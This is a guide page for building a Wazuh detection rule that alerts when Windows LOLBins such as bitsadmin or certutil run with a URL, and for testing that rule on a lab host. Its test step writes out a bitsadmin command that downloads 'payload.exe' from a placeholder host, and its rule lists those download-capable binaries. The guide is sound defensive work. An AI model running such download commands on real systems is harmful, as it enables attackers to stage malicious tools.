# 01 · Process & command-line monitoring

**MITRE:** T1059 (Command and Scripting Interpreter), T1105 (Ingress Tool Transfer)

### What this catches

Any process launch on the Windows host, with the full command line, parent process and hashes. Sysmon already logs this as Event ID 1 once Phase 7 of the core guide is done. What is missing is a rule that flags *suspicious* command lines instead of just recording all of them.

This rule watches a short list of living-off-the-land binaries (LOLBins) that Windows ships by default and attackers abuse to download or execute payloads. If one of them is launched with a URL in its command line, that is worth an alert.

### Configure

SSH into the Wazuh server:

```powershell
ssh <UBUNTU_USER>@<WAZUH_SERVER_IP>
```

Edit the local rules file:

```bash
sudo nano /var/ossec/etc/rules/local_rules.xml
```

Leave the example rule that ships with the file alone. Add this group **after** the existing `</group>`, at the bottom of the file:

```xml
<group name="custom,windows,lolbin,">
  <rule id="100201" level="12">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)\\(certutil|regsvr32|mshta|rundll32|bitsadmin)\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(http|ftp)://</field>
    <description>Execution: LOLBin $(win.eventdata.image) making a network reference (T1059/T1105)</description>
    <mitre>
      <id>T1105</id>
    </mitre>
  </rule>
</group>
```

Save it. Restart the manager:

```bash
sudo systemctl restart wazuh-manager
```

Confirm all three services are back:

```bash
sudo systemctl is-active wazuh-manager wazuh-indexer wazuh-dashboard
```

> ✅ Each line prints `active`.

> ⚠️ Wazuh loads its built-in rules before `local_rules.xml`. If a built-in rule already matches the same event as yours, yours is silently shadowed and never fires. My rule fired without conflict, but if yours does not, search `wazuh-alerts-*` for the same process and note which rule ID won.

### Test on the Windows host

The event has to originate on Windows. A process launched from Kali produces a Linux event, and this rule only matches Windows Sysmon fields.

Open and run `bitsadmin` against an unreachable URL:

```powershell
bitsadmin /transfer testjob /Priority HIGH http://example.com/payload.exe C:\Temp\payload.exe
```

Two failures are expected and do not matter. The first is `0x8007010b` if `C:\Temp` does not exist—create it with `New-Item -ItemType Directory C:\Temp` and run the command again. The second is `0x80190194`, which is just the HTTP 404 from `example.com`. The rule does not care whether the transfer succeeds. It matches the moment the `bitsadmin.exe` process starts with a URL in its command line.

### Verify

In the dashboard, open **Threat Hunting ➜ Events**, set the time range to **Today**, and search:

```text
rule.id:100201
```

> ✅ You see the `bitsadmin` event with `rule.level: 12`, the full `commandLine` including the URL, the parent process (`powershell.exe`), and the MITRE tag T1105. The alert also carries `"mail": true`, so it will flow into any email or integration you add later.

> 💡 `firedtimes: 2` . If you ran the command twice—once before `C:\Temp` existed and once after—both process creations match. The rule fires per process launch, not per successful download.

[Back to detections](README.md)
